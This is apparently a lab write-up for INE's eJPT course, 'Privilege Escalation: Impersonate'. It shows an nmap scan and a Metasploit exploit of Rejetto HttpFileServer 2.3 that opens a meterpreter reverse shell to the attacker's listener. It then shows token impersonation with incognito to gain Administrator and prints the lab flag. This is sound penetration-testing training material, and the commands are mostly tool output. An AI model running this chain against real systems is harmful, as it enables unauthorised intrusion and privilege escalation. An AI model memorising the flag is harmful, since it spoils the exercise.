```jsx
Lab Name: Privilege Escalation: Impersonate
Platform: INE
Lab No: 15
Exam: eJPT (Jr. Penetartion Tester)
```

## Pinging:

```console
┌──(root㉿INE)-[~]
└─# ping -c 4 demo.ine.local
PING demo.ine.local (10.4.18.166) 56(84) bytes of data.
64 bytes from demo.ine.local (10.4.18.166): icmp_seq=1 ttl=125 time=9.47 ms
64 bytes from demo.ine.local (10.4.18.166): icmp_seq=2 ttl=125 time=8.53 ms
64 bytes from demo.ine.local (10.4.18.166): icmp_seq=3 ttl=125 time=8.72 ms
64 bytes from demo.ine.local (10.4.18.166): icmp_seq=4 ttl=125 time=8.50 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 8.498/8.805/9.474/0.394 ms
```

## NMAP Scan:

```console
┌──(root㉿INE)-[~]
└─# nmap -sV -O 10.4.18.166
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 19:13 IST
Nmap scan report for demo.ine.local (10.4.18.166)
Host is up (0.0085s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          HttpFileServer httpd 2.3
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/27%OT=80%CT=1%CU=36033%PV=Y%DS=3%DC=I%G=Y%TM=66CD
OS:D819%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%                     
OS:TS=U)OPS(O1=M546NW8NNS%O2=M546NW8NNS%O3=M546NW8%O4=M546NW8NNS%O5=M546NW8
OS:NNS%O6=M546NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R
OS:=Y%DF=Y%T=7F%W=FFFF%O=M546NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=7F%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=Y%DF=Y%T=7F%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=7F%W=
OS:0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=7F%W=0%S=A%A=O
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=7F%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=7F%
OS:CD=Z)

Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.82 seconds
```

## Exploitation:

```console
msf6 > search hfs

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1    \_ target: Automatic                      .                .          .      .
   2    \_ target: Windows Powershell             .                .          .      .
   3  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/rejetto_hfs_exec                                                                                                                                                                                                                            

msf6 > use 3
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:por
                                         t][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/d
                                         ocs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. Thi
                                         s must be an address on the local machine or 0.0.0.0
                                         to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly
                                          generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     10.10.42.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOST 10.4.18.166
RHOST => 10.4.18.166
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.42.2:4444 
[*] Using URL: http://10.10.42.2:8080/qRfRKBQopXC2I
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /qRfRKBQopXC2I
[*] Sending stage (176198 bytes) to 10.4.18.166
[!] Tried to delete %TEMP%\wVemL.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.42.2:4444 -> 10.4.18.166:49792) at 2024-08-27 19:25:53 +0530
[*] Server stopped.

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
```

```console
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege
```

```console
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available
```

```console
meterpreter > impersonate_token ATTACKDEFENSE\\Administrator
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > ls
Listing: C:\http-server
=======================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2024-08-27 19:25:53 +0530  %TEMP%
100777/rwxrwxrwx  834936  fil   2021-03-23 18:54:38 +0530  PsExec.exe
100777/rwxrwxrwx  760320  fil   2014-02-16 18:28:52 +0530  hfs.exe
100666/rw-rw-rw-  103     fil   2021-04-22 11:18:38 +0530  start.ps1

meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
x28c832a39730b7d46d6c38f1ea18e12

meterpreter >
```
